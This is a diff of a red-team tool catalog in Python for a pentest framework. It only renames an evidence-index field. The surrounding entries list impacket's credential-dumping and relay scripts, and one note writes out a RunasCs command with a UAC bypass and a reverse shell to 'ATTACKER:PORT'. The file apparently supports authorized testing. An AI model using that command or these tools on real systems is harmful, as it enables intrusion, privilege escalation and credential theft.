@@ -1,7 +1,7 @@
 """External red-team tool catalog: purpose, install, and Burp-routing tier.
 
 Praetor's web lane (Rule 26a) needs every request to land in Burp for a
-replayable logger_index. Tools are tagged by how they fit that model:
+replayable proxy_history_index. Tools are tagged by how they fit that model:
 
   tier "A" - emits HTTP or is offline; wraps cleanly via tools/recon/_common
              `_run_cmd` (auto HTTPS_PROXY -> Burp) or produces a local artifact.
@@ -74,7 +74,7 @@ REDTEAM_TOOLS: dict[str, dict] = {
         "tier": "C", "routes_burp": False,
         "purpose": "SMB/LDAP/Kerberos toolkit: secretsdump, psexec, wmiexec, GetUserSPNs, ntlmrelayx.",
         "install": {"kali": "sudo apt install impacket-scripts python3-impacket", "other": "pipx install impacket"},
-        "note": "SMB/Kerberos — Burp-blind. Evidence = session log + loot files, not logger_index.",
+        "note": "SMB/Kerberos — Burp-blind. Evidence = session log + loot files, not proxy_history_index.",
     },
     "netexec": {
         "tier": "C", "routes_burp": False,
@@ -146,7 +146,7 @@ REDTEAM_TOOLS: dict[str, dict] = {
         "tier": "C", "routes_burp": False,
         "purpose": "Run a process as another user from a non-interactive/service shell using a known credential (context pivot without a noisy remote logon).",
         "install": {"kali": "n/a (drop RunasCs.exe on host)", "other": "https://github.com/antonioCoco/RunasCs"},
-        "note": "On-host Windows binary. `RunasCs.exe <user> <pass> <cmd> --bypass-uac -r ATTACKER:PORT`. Quieter than psexec/winrm for moving svc_* -> a recovered user once DPAPI/BloodHound hands you creds. Output = loot/session, not logger_index.",
+        "note": "On-host Windows binary. `RunasCs.exe <user> <pass> <cmd> --bypass-uac -r ATTACKER:PORT`. Quieter than psexec/winrm for moving svc_* -> a recovered user once DPAPI/BloodHound hands you creds. Output = loot/session, not proxy_history_index.",
     },
     "kerbrute": {
         "tier": "C", "routes_burp": False,
